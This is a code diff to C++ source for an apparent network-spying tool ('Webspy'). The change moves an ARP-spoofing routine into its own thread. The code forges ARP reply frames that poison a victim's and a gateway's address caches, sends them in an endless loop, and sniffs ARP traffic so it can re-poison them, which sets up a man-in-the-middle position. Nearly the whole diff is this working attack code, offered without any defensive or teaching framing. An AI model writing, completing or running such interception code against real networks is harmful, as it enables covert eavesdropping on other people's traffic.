@@ -11,9 +11,16 @@ Spoofer::Spoofer() {}
 
 Spoofer::~Spoofer() {}
 
-void Spoofer::spoof(){
-	// Poisoned frame to victim
+void Spoofer::init(){
+	pthread_t thread;
+	if(pthread_create(&thread, NULL, spoof, NULL) < 0){
+		printf("Webspy::Spoofer::Constructor > [ERRO] can't init spoofing thread\n");
+		exit(EXIT_FAILURE);
+	}
+}
 
+void* Spoofer::spoof(void* args){
+	// Poisoned frame to victim
 	Crafter toVictim(Globals::iface);
 	toVictim.arp(
 		ARPOP_REPLY,
@@ -28,15 +35,19 @@ void Spoofer::spoof(){
 
 	// Poisoned frame to gateway
 	Crafter toGateway(Globals::iface);
-	toGateway.arp(ARPOP_REPLY, Globals::attacker.mac->ether_addr_octet, Globals::victim.ip, Globals::gateway.mac->ether_addr_octet, Globals::gateway.ip);
-	toGateway.ethernet(ETHERTYPE_ARP, Globals::attacker.mac->ether_addr_octet, Globals::gateway.mac->ether_addr_octet);
+	toGateway.arp(
+		ARPOP_REPLY,
+		Globals::attacker.mac->ether_addr_octet, Globals::victim.ip,
+		Globals::gateway.mac->ether_addr_octet, Globals::gateway.ip
+	);
+	toGateway.ethernet(
+		ETHERTYPE_ARP,
+		Globals::attacker.mac->ether_addr_octet,
+		Globals::gateway.mac->ether_addr_octet
+	);
 
-	Sniffer sniffer("arp");
-
-	// TODO Init thread
-	pthreat_t* spooferThread;
-
-	if(pthread_create(spooferThread, NULL, spoofing, NULL))
+	char filter[] = "arp";
+	Sniffer sniffer(filter);
 
 	printf("Spoofing victims\n");
 	do{
@@ -47,6 +58,8 @@ void Spoofer::spoof(){
 
 		sniffer.listen(spoofBack);
 	} while(true);
+
+	return NULL;
 }
 
 void Spoofer::spoofBack(u_char* args, const struct pcap_pkthdr* header, const unsigned char* packet) {
